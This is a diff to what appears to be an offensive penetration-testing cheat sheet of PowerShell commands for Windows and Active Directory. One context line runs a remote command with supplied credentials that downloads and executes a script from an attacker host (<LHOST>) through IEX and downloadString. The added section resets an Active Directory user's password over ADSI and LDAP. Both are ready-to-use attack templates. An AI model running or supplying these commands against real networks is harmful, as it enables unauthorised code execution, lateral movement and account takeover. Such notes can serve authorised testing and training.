@@ -5076,6 +5076,14 @@ PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<
 PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
+#### Set User Password via Active Directory Service Interfaces (ADSI)
+
+```cmd
+PS C:\> $user = [adsi]"LDAP://CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>"
+PS C:\> $user.SetPassword('<PASSWORD>')
+PS C:\> $user.SetInfo()
+```
+
 #### New-PSSession
 
 ```cmd
